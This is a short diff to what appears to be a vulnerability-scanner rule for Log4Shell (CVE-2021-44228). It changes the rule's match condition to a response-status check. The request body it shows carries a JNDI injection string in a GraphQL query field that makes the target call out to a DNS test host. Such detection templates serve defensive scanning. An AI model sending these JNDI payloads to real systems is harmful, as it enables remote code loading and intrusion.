@@ -16,7 +16,7 @@ rules:
       path: /graphql
       body: '{"query":"${jndi:dns://{{dnstest}}/tea}","variables":{"duration":{"start":"2021-12-22
         1259","end":"2021-12-22 1314","step":"MINUTE"}}'
-    expression: "true"
+    expression: response.status >= 200
   r2:
     request:
       method: GET
